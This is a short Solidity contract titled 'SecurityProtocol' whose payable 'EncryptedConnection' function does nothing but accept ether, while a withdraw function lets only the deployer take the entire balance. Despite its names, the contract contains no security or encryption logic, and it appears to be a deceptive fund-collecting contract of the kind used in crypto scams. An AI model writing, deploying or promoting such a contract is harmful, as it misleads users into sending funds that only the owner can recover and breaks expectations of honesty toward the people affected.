// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

contract SecurityProtocol {

    address private owner;
    uint256 private totalReceived;

    constructor() public {   
        owner = msg.sender;
    }

    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function EncryptedConnection() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}